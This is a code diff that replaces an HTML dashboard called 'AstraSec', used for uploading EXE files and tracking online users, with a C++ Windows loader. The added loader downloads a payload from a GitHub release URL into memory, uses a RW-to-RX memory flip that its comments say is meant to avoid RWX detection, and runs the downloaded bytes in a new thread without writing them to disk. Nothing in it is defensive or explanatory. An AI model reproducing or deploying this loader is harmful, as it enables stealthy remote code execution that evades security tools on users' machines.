@@ -1,161 +1,49 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AstraSec</title>
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box;}body{font-family:system-ui,-apple-system,sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;}a{color:#635bff;text-decoration:none;margin:8px;}a:hover{color:#fff;}button{cursor:pointer;padding:8px 16px;background:#635bff;color:#fff;border:none;border-radius:4px;font-size:14px;}button:hover{background:#5a4eff;} .card{background:#1a1a1a;padding:20px;margin:10px 0;border-radius:8px;border:1px solid #333;} .card h3{margin-bottom:8px;} .status-online{color:#06d6a0;} .status-offline{color:#666;} .container{max-width:800px;margin:20px auto;padding:20px;} .section{display:none;} .section.active{display:block;} .muted{color:#888;font-size:0.8rem;}
-  </style>
-</head>
-<body>
-<div class="container">
-  <h1 style="margin-bottom:16px;">AstraSec</h1>
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <vector>
+#include <string>
 
-  <!-- SECTION 1: CREATE PROJECT -->
-  <section id="section-create" class="section active">
-    <div class="card">
-      <h2>Create New Project</h2>
-      <form id="form-create">
-        <input type="text" id="input-name" placeholder="Project name (e.g. Project 1)" style="width:100%;padding:8px;background:#111;border:1px solid #444;color:#fff;border-radius:4px;margin-bottom:1rem;">
-        <input type="file" id="input-exe" accept=".exe" style="width:100%;padding:8px;background:#111;border:1px solid #444;color:#fff;border-radius:4px;margin-bottom:1rem;">
-        <button type="submit" style="width:100%;background:#635bff;">Create App</button>
-      </form>
-    </div>
-  </section>
+#pragma comment(lib, "wininet.lib")
 
-  <!-- SECTION 2: OVERVIEW -->
-  <section id="section-overview" class="section">
-    <div class="card">
-      <h2 id="overview-h2">Project Overview</h2>
-      <div id="overview-content">
-        <!-- Content loaded by JS -->
-      </div>
-      <form id="form-update-exe" style="margin-top:1rem;">
-        <input type="file" id="input-new-exe" accept=".exe" style="width:100%;padding:8px;background:#111;border:1px solid #444;color:#fff;border-radius:4px;">
-        <button type="submit" style="width:100%;background:#635bff;">Update EXE</button>
-      </form>
-    </div>
-    <button onclick="showSection('create')" style="margin-top:10px;background:#444;">← Back to Projects</button>
-  </section>
+// Replace with your raw GitHub Release asset URL
+// Format: https://github.com/OWNER/REPO/releases/download/TAG/filename.exe
+const char* PAYLOAD_URL = "https://github.com/YOUR_USER/YOUR_REPO/releases/download/v1.0/cheat.exe";
 
-  <!-- SECTION 3: USERS -->
-  <section id="section-users" class="section">
-    <div class="card">
-      <h2>Users Overview</h2>
-      <p>Online users: <span id="span-online">0</span></p>
-      <p class="muted">Tracking usage across all projects</p>
-      <button onclick="showSection('create')" style="margin-top:10px;background:#444;">← Back to Projects</button>
-    </div>
-  </section>
-</div>
+int main() {
+    std::cout << "Loading..." << std::endl;
 
-<script>
-  // State from localStorage (remembers projects when you refresh)
-  let projects = JSON.parse(localStorage.getItem('astrasec') || '[]');
-  let onlineUsers = 0;
+    // 1. Download payload via WinINet (in memory, no disk write)
+    HINTERNET hInternet = InternetOpenA("AstraLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) { std::cout << "Net init failed." << std::endl; return 1; }
 
-  // Show/hide sections
-  function showSection(name) {
-    const create = document.getElementById('section-create');
-    const overview = document.getElementById('section-overview');
-    const users = document.getElementById('section-users');
+    HINTERNET hFile = InternetOpenUrlA(hInternet, PAYLOAD_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hFile) { InternetCloseHandle(hInternet); std::cout << "Fetch failed." << std::endl; return 1; }
 
-    create.classList.remove('active');
-    overview.classList.remove('active');
-    users.classList.remove('active');
-
-    if (name === 'create') create.classList.add('active');
-    if (name === 'overview') overview.classList.add('active');
-    if (name === 'users') users.classList.add('active');
-  }
-
-  // Render projects and sections
-  function render() {
-    const create = document.getElementById('section-create');
-    const overview = document.getElementById('section-overview');
-    const users = document.getElementById('section-users');
-
-    // Hide all
-    create.classList.remove('active');
-    overview.classList.remove('active');
-    users.classList.remove('active');
-
-    // If no projects, show create only
-    if (projects.length === 0) {
-      create.classList.add('active');
-      document.getElementById('span-online').textContent = '0';
-      return;
+    std::vector<BYTE> payload;
+    BYTE buffer[4096];
+    DWORD bytesRead = 0;
+    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+        payload.insert(payload.end(), buffer, buffer + bytesRead);
     }
+    InternetCloseHandle(hFile);
+    InternetCloseHandle(hInternet);
 
-    // Show create
-    create.classList.add('active');
+    if (payload.empty()) { std::cout << "Empty payload." << std::endl; return 1; }
 
-    // Show overview for first project
-    const first = projects[0];
-    document.getElementById('overview-h2').textContent = `Project Overview: ${first.name}`;
-    document.getElementById('overview-content').innerHTML = `
-      <p><strong>EXE Status:</strong> ${first.exe || 'No EXE uploaded'}</p>
-      <p><strong>Online:</strong> <span class="status-online">${first.online || 0}</span></p>
-      <p><strong>Project ID:</strong> ${first.id}</p>
-    `;
-    overview.classList.add('active');
+    // 2. Allocate RW memory, copy, then flip to RX (avoid RWX detection)
+    LPVOID mem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!mem) return 1;
+    memcpy(mem, payload.data(), payload.size());
 
-    // Users online count
-    onlineUsers = Math.max(...projects.map(p => p.online || 0), 0);
-    document.getElementById('span-online').textContent = onlineUsers;
+    DWORD oldProtect;
+    VirtualProtect(mem, payload.size(), PAGE_EXECUTE_READ, &oldProtect);
 
-    // Users list
-    let usersHtml = '<h3>Project Activity</h3>';
-    projects.forEach((p, i) => {
-      usersHtml += `<p>Project ${i+1} (${p.name}): <span class="${p.online > 0 ? 'status-online' : 'status-offline'}">${p.online || 0} online</span></p>`;
-    });
-    users.innerHTML = usersHtml;
-    users.classList.add('active');
-  }
-
-  // Create project form
-  document.getElementById('form-create').addEventListener('submit', e => {
-    e.preventDefault();
-    const name = document.getElementById('input-name').value.trim();
-    const file = document.getElementById('input-exe').files[0];
-
-    if (!name || !file) return alert('Enter project name and upload EXE');
-
-    const reader = new FileReader();
-    reader.onload = e => {
-      projects.push({
-        id: Date.now().toString(),
-        name,
-        exe: 'EXE uploaded',
-        online: 0
-      });
-      localStorage.setItem('astrasec', JSON.stringify(projects));
-      render();
-      alert('Project created! View overview or users.');
-    };
-    reader.readAsDataURL(file);
-  });
-
-  // Update EXE form
-  document.getElementById('form-update-exe').addEventListener('submit', e => {
-    e.preventDefault();
-    const file = document.getElementById('input-new-exe').files[0];
-    if (!file) return alert('Select an EXE file');
-
-    const reader = new FileReader();
-    reader.onload = e => {
-      // Update first project's EXE status
-      projects[0].exe = 'EXE updated';
-      localStorage.setItem('astrasec', JSON.stringify(projects));
-      render();
-      alert('EXE updated successfully!');
-    };
-    reader.readAsDataURL(file);
-  });
-
-  // Initialize
-  render();
-</script>
-</body>
-</html>
+    // 3. Execute
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+    if (hThread) {
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+    return 0;
+}
